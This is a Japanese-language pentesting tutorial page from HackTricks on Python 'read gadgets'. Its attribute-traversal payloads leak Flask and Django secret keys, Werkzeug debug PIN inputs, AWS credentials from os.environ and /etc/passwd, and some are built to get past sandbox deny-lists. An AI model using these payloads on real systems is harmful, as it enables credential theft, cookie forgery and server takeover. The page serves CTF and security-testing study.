# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}


## 基本情報

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) や [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) などの異なる脆弱性により、**Python の内部データを読み取れるものの、コードを実行できない**場合があります。そのため、pentester はこれらの読み取り権限を最大限に活用し、**機密性の高い権限を取得して脆弱性をエスカレート**する必要があります。

### Flask - secret key の読み取り

Flask アプリケーションのメインページには、おそらく **secret が設定されている**グローバルな **`app`** オブジェクトがあります。
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
この場合、[**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html) にある **global objects にアクセスする**ための任意の gadget を使うだけで、この object にアクセスできます。

**vulnerability が別の python file にある場合**は、ファイルを辿る gadget を使って main file に到達し、**global object `app.secret_key` にアクセス**する必要があります。その後、この key を知っていることで[**権限昇格**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)が可能になります。

このような payload は、[この writeup](https://ctftime.org/writeup/36082) からのものです。<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
この payload を使用して **`app.secret_key` を読み取る**ことができます。元のバグによって書き込みプリミティブ（たとえば、class pollution）も利用できる場合は、同じ経路を使ってこれを置き換え、より高い権限を持つ Flask cookies に署名できます。

### Werkzeug - machine_id と node uuid

[**この writeup の payload を使用すると**](https://vozec.fr/writeups/tweedle-dum-dee/)、**machine_id** と **uuid** node にアクセスできます。これらは、[**Werkzeug pin を生成する**](../../network-services-pentesting/pentesting-web/werkzeug.md)ため、および **debug mode** が有効な場合に `/console` の python console にアクセスするために必要な **private bits** です。<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> **`app.py` へのサーバーのローカルパス**は、Web ページに何らかの **error** を生成することで取得でき、その **path** が表示されることに注意してください。

vulnerability が別の Python ファイルにある場合は、メインの Python ファイルから objects にアクセスするために、前述の Flask trick を確認してください。

### Django - SECRET_KEY and settings module

Django の settings object は、application の起動後に `sys.modules` に cache されます。read primitives だけで、**`SECRET_KEY`**、fallback keys、database credentials、signing salts を leak できます。
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
脆弱な gadget が別の module にある場合は、まず globals を辿ります：
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` は現在の `SECRET_KEY` と同様に価値があります。ローテーション中も、古い署名済みの値を検証できるためです。<sup>[[1]](#references)</sup> また、`SESSION_ENGINE` と `SESSION_SERIALIZER` も leak すると、影響が cookie forgery のみなのか、それともより強力なものなのかを迅速に判断できます。Web への影響の詳細については、[**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md) を確認してください。

### Module loader gadgets - ソースコードとファイルの読み取り

読み込まれた Python modules には通常 `__loader__` が保持されています。File-backed loaders は `get_source()` と `get_data()` を公開していることが多く、module object には到達できるものの `open()` には到達できない場合に、非常に有用な **read-only primitives** となります：
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
これは **config modules、blueprints、helper files、hidden routes** を dump し、API keys、DSNs、flag paths、または追加の gadget entry points を回収するのに非常に便利です。

subclass enumeration しかない場合は、index をハードコーディングするのではなく、名前で loader を検索します：
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame の globals

Generator/coroutine object を作成または到達できる場合、その frame は、任意の関数 `__globals__` gadget を必要とせずに globals を leak できます。これは、dunder name のみを block し、`gi_frame`、`ag_frame`、`cr_frame`、`f_globals` などの frame attributes を見落とす filter に対して有用です：
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
frame globals を取得したら、他の gadgets（`sys.modules`、settings objects、`os.environ` など）とまったく同じ手順を続けます。最近の sandbox escape では、`gi_frame` と `f_globals` が dunder attributes ではなく、単純な deny-list を回避して残っていることが多いため、この手法が何度も再発見されています。

### 読み込まれたモジュール経由の環境変数 / cloud creds

多くの jail では、どこかで `os` または `sys` が import されています。到達可能な任意の関数の `__init__.__globals__` を悪用して、すでに import 済みの `os` module に pivot し、API tokens、cloud keys、flags を含む **environment variables** をダンプできます：
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
サブクラスインデックスがフィルタリングされている場合は、loaders を使用します:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
環境変数は、read から完全な compromise へ移行するために必要な唯一の secrets であることが少なくありません（cloud IAM keys、database URLs、signing keys など）。

### Django-Unicorn class pollution（CVE-2025-24370）

`django-unicorn`（[**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)、`<0.62.0`）では、細工した component requests を介して **class pollution** が可能でした。`__init__.__globals__` のような property path を設定すると、攻撃者は component module の globals と、そこから import されたモジュール（例：`settings`、`os`、`sys`）に到達できました。そこから、code execution なしで `SECRET_KEY`、`DATABASES`、または service credentials を leak できます。この exploit chain は完全に read ベースで、上記と同じ dunder-gadget パターンを使用します。<sup>[[5]](#references)</sup>

### chaining 用の Gadget collections

最近の CTF や pyjail research では、attribute access と subclass enumeration のみで構築された、信頼性の高い read chain が示されています。[**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) のような community-maintained lists には、objects から `__globals__`、`sys.modules`、そして最終的に sensitive data へ traverse するために組み合わせられる、数百の最小限の gadgets が catalog されています。<sup>[[2]](#references)</sup> raw subclass indexes よりも **attribute/name based searches** を優先してください。`os._wrap_close`、`FileLoader`、`warnings.catch_warnings` などの位置は、Python versions 間や追加で import された libraries によって変化するためです。

## References

- [1] [Django の cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)

{{#include ../../banners/hacktricks-training.md}}
